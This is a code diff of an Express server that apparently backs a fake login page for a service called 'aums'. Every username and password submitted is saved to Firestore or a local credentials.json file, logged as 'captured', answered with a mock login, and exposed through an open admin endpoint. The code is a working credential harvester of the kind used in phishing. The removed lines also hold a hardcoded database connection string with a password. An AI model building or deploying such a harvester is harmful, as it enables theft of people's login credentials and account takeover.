@@ -1,43 +1,11 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const mongoose = require('mongoose');
+const admin = require('firebase-admin');
+const fs = require('fs').promises;
 
 const app = express();
 const PORT = 3000;
-
-// Connect to MongoDB
-const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://Chethan=MyPassword123@cluster0.fiyebyi.mongodb.net/aums?appName=Cluster0';
-const LOCAL_URI = 'mongodb://127.0.0.1:27017/aums';
-
-async function connectDB() {
-    try {
-        console.log('Connecting to MongoDB Atlas...');
-        await mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000 });
-        console.log('Connected to MongoDB Atlas successfully.');
-    } catch (err) {
-        console.error('MongoDB Atlas connection error:', err.message);
-        console.log('Attempting local MongoDB fallback...');
-        try {
-            await mongoose.disconnect();
-            await mongoose.connect(LOCAL_URI);
-            console.log('Connected to local fallback MongoDB successfully.');
-        } catch (localErr) {
-            console.error('Local fallback MongoDB connection error:', localErr.message);
-        }
-    }
-}
-
-connectDB();
-
-// Define Credential Schema & Model
-const CredentialSchema = new mongoose.Schema({
-    username: { type: String, required: true },
-    password: { type: String, required: true },
-    timestamp: { type: Date, default: Date.now }
-});
-
-const Credential = mongoose.model('Credential', CredentialSchema);
 
 // Enable CORS so the static frontend can communicate with the backend
 app.use(cors());
@@ -47,6 +15,109 @@ app.use(express.json());
 
 // Serve static frontend files from the same directory
 app.use(express.static(__dirname));
+
+// Local JSON storage path for credentials fallback
+const CREDENTIALS_FILE = path.join(__dirname, 'credentials.json');
+
+let db = null;
+let useFirebase = false;
+
+// Initialize Firebase Admin SDK if service account is provided in environment variables
+if (process.env.FIREBASE_SERVICE_ACCOUNT) {
+    try {
+        const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
+        admin.initializeApp({
+            credential: admin.credential.cert(serviceAccount)
+        });
+        db = admin.firestore();
+        useFirebase = true;
+        console.log('Connected to Firebase Cloud Firestore successfully.');
+    } catch (err) {
+        console.error('Firebase Cloud Firestore initialization error:', err.message);
+        console.log('Attempting local JSON file fallback...');
+    }
+}
+
+if (!useFirebase) {
+    console.log('Firebase credentials not set. Using local credentials.json storage.');
+}
+
+// Database Helper: Save credential
+async function saveCredential(username, password) {
+    const timestamp = new Date().toISOString();
+    
+    if (useFirebase && db) {
+        try {
+            await db.collection('credentials').add({
+                username,
+                password,
+                timestamp
+            });
+            console.log(`[FIREBASE SAVED] Captured credentials for user: "${username}"`);
+            return;
+        } catch (err) {
+            console.error('[FIREBASE ERROR] Failed to save credential:', err.message);
+            console.log('Falling back to local storage...');
+        }
+    }
+    
+    // Local JSON File Fallback
+    try {
+        let credentials = [];
+        try {
+            const fileData = await fs.readFile(CREDENTIALS_FILE, 'utf8');
+            credentials = JSON.parse(fileData);
+        } catch (readErr) {
+            // File does not exist or is empty/corrupt, start with empty list
+        }
+        
+        credentials.push({
+            username,
+            password,
+            timestamp
+        });
+        
+        await fs.writeFile(CREDENTIALS_FILE, JSON.stringify(credentials, null, 4), 'utf8');
+        console.log(`[LOCAL SAVED] Captured credentials for user: "${username}" locally`);
+    } catch (err) {
+        console.error('[LOCAL STORAGE ERROR] Failed to save credential:', err.message);
+    }
+}
+
+// Database Helper: Retrieve all credentials (latest first)
+async function getCredentials() {
+    if (useFirebase && db) {
+        try {
+            const snapshot = await db.collection('credentials').orderBy('timestamp', 'desc').get();
+            const credentials = [];
+            snapshot.forEach(doc => {
+                credentials.push({
+                    id: doc.id,
+                    ...doc.data()
+                });
+            });
+            return credentials;
+        } catch (err) {
+            console.error('[FIREBASE ERROR] Failed to fetch credentials:', err.message);
+            console.log('Falling back to local storage...');
+        }
+    }
+    
+    // Local JSON File Fallback
+    try {
+        try {
+            const fileData = await fs.readFile(CREDENTIALS_FILE, 'utf8');
+            const credentials = JSON.parse(fileData);
+            // Sort by timestamp descending
+            return credentials.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        } catch (readErr) {
+            return []; // No credentials yet
+        }
+    } catch (err) {
+        console.error('[LOCAL STORAGE ERROR] Failed to fetch credentials:', err.message);
+        throw err;
+    }
+}
 
 // Login API endpoint
 app.post('/api/login', async (req, res) => {
@@ -60,13 +131,8 @@ app.post('/api/login', async (req, res) => {
         });
     }
 
-    try {
-        // Save user's typed credentials to MongoDB
-        await Credential.create({ username, password });
-        console.log(`[DATABASE SAVED] Captured credentials for user: "${username}"`);
-    } catch (err) {
-        console.error('[DATABASE ERROR] Failed to save credential:', err);
-    }
+    // Save user's credentials to active database layer
+    await saveCredential(username, password);
 
     // Mock authentication:
     // If username or password contains 'error' (case-insensitive), simulate failure.
@@ -82,10 +148,11 @@ app.post('/api/login', async (req, res) => {
         message: 'Login recorded successfully.'
     });
 });
+
 // Admin API endpoint to retrieve all credentials
 app.get('/api/admin/credentials', async (req, res) => {
     try {
-        const credentials = await Credential.find().sort({ timestamp: -1 });
+        const credentials = await getCredentials();
         return res.status(200).json({
             success: true,
             data: credentials
@@ -99,7 +166,7 @@ app.get('/api/admin/credentials', async (req, res) => {
     }
 });
 
-
+// Conditionally run the local HTTP listener when run directly
 if (require.main === module) {
     app.listen(PORT, () => {
         console.log(`==================================================`);
